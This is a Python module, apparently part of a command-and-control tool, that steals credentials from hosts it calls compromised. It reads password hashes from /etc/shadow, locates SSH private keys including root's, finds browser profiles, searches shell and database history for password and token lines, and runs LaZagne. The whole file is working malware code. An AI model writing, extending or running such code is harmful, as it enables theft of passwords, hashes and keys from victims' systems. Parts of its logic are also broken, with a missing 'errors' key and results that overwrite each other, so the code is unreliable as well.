# Vesper Bridge — Credential Dumper Handler
# =========================================
# Dumps credentials from compromised hosts:
#   Linux: /etc/shadow, ~/.ssh, ~/.bash_history, browser cookies
#   Windows: Mimikatz, LSASS dump, SAM hive
#   Cross-platform: LaZagne (browsers, databases, email, wifi)

import json
import os
import subprocess
import platform
from pathlib import Path


def dump_credentials(params: dict) -> dict:
    """Dump credentials from the local system."""
    method = params.get("method", "all")
    system = platform.system().lower()
    results = {"passwords": [], "hashes": [], "ssh_keys": [], "tokens": [], "errors": []}

    if method in ("shadow", "all") and system == "linux":
        results.update(_dump_shadow())

    if method in ("ssh", "all"):
        results.update(_dump_ssh_keys())

    if method in ("browser", "all"):
        results.update(_dump_browser_data())

    if method in ("history", "all"):
        results.update(_dump_command_history())

    if method in ("mimikatz", "all") and system == "windows":
        results["errors"].append("Mimikatz not deployed — run from Windows target")

    if method in ("lazagne", "all"):
        results.update(_run_lazagne())

    return {
        "credentials_found": len(results["passwords"]) + len(results["hashes"]),
        "ssh_keys_found": len(results["ssh_keys"]),
        "tokens_found": len(results["tokens"]),
        "results": results,
    }


def _dump_shadow() -> dict:
    results = {"passwords": [], "hashes": [], "errors": []}
    try:
        if os.geteuid() != 0:
            results["errors"].append("Need root to read /etc/shadow")
            return results

        with open("/etc/shadow") as f:
            for line in f:
                if line.strip() and not line.startswith("#"):
                    parts = line.split(":")
                    if len(parts) >= 2 and parts[1] not in ("*", "!", "!!", ""):
                        results["hashes"].append({
                            "username": parts[0],
                            "hash": parts[1],
                            "format": "sha512crypt" if parts[1].startswith("$6$") else "unknown"
                        })
    except Exception as e:
        results["errors"].append(f"shadow: {e}")
    return results


def _dump_ssh_keys() -> dict:
    results = {"ssh_keys": []}
    ssh_dir = Path.home() / ".ssh"
    if ssh_dir.exists():
        for key_file in ssh_dir.glob("id_*"):
            if key_file.suffix != ".pub":
                try:
                    content = key_file.read_text()
                    results["ssh_keys"].append({
                        "path": str(key_file),
                        "type": key_file.name,
                        "has_passphrase": "ENCRYPTED" in content[:50]
                    })
                except Exception:
                    pass
    # Check root's keys too
    root_ssh = Path("/root/.ssh")
    if root_ssh.exists():
        try:
            for key_file in root_ssh.glob("id_*"):
                if key_file.suffix != ".pub":
                    results["ssh_keys"].append({
                        "path": str(key_file),
                        "type": "root_" + key_file.name,
                        "has_passphrase": False
                    })
        except PermissionError:
            pass
    return results


def _dump_browser_data() -> dict:
    results = {"tokens": [], "passwords": []}
    browser_dirs = [
        Path.home() / ".mozilla/firefox",
        Path.home() / ".config/google-chrome",
        Path.home() / "AppData/Local/Google/Chrome",
        Path.home() / "Library/Application Support/Google/Chrome",
    ]
    for bd in browser_dirs:
        if bd.exists():
            results["tokens"].append({
                "browser": bd.name,
                "path": str(bd),
                "has_data": True
            })
    return results


def _dump_command_history() -> dict:
    results = {"passwords": []}
    history_files = [
        Path.home() / ".bash_history",
        Path.home() / ".zsh_history",
        Path.home() / ".mysql_history",
        Path.home() / ".psql_history",
        Path("/root/.bash_history"),
    ]
    for hf in history_files:
        if hf.exists():
            try:
                content = hf.read_text()
                # Extract lines with passwords/credentials
                for line in content.splitlines():
                    lower = line.strip().lower()
                    if any(kw in lower for kw in ["password", "passwd", "credential", "token", "secret", "api_key", "mysql -u", "psql -u", "ssh ", "scp "]):
                        results["passwords"].append({"source": str(hf), "line": line.strip()[:200]})
            except Exception:
                pass
    return results


def _run_lazagne() -> dict:
    results = {"passwords": []}
    try:
        proc = subprocess.run(
            ["python3", "LaZagne/laZagne.py", "all", "-oJ"],
            capture_output=True, text=True, timeout=60
        )
        if proc.stdout:
            try:
                data = json.loads(proc.stdout)
                results["passwords"] = data
            except json.JSONDecodeError:
                results["passwords"] = [{"raw_output": proc.stdout[:500]}]
    except FileNotFoundError:
        results["errors"].append("LaZagne not installed")
    except Exception as e:
        results["errors"].append(f"LaZagne error: {e}")
    return results


def register_routes(registry: dict) -> None:
    """Expose this module's handlers under the 'cred_dump' group."""
    registry["cred_dump"] = {
        "dump": dump_credentials,
    }
